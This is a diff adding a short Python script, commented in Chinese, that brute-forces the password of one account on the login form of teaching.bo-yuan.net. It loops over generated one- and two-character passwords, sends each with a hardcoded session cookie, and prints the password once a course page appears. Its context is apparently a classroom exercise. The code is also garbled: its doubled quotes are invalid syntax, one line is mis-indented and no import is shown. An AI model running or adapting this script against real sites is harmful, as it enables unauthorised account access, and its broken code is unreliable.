@@ -1,0 +1,40 @@
+plist=["a","b","c","d","e","1","2","3","4","5","6","7","8","9","0"]
+passwdlist=[]
+
+def createPasswd(a=2,v=""""):
+	global passwdlist
+	for d in plist:
+		passwdlist+=[v+d]
+		if a>1:
+			createPasswd(a-1,v+d)
+
+createPasswd(2,"")
+
+for p in passwdlist:
+	r1=requests.post("http://teaching.bo-yuan.net/",
+	headers={
+		""Cookie"":"PHPSESSID=48tivgrq44ku1rh9p1n2rcp937",#用來驗證獲取有設定權限的資料，例如:帳號登陸後才能顯示的畫面。
+		""User-Agent"":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36"
+	},
+	params={
+		""uid"":"5fb46de211580"
+	},
+	data={
+		""ex[class]"":"5f9d7897cfa59",
+		""ex[username]"":"99測試",
+		""ex[password]"":p
+		}#預設格式傳遞資料
+	)
+	 print(r1.encoding)
+
+	r2=requests.get("http://teaching.bo-yuan.net/",
+	headers={
+		""Cookie"":"PHPSESSID=48tivgrq44ku1rh9p1n2rcp937",#用來驗證獲取有設定權限的資料，例如:帳號登陸後才能顯示的畫面。
+		""User-Agent"":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36"
+		}
+	)
+
+	r2.encoding=""utf8""
+	if""課程內容"" in r2.text:
+		print(""密碼是："",p)
+		break
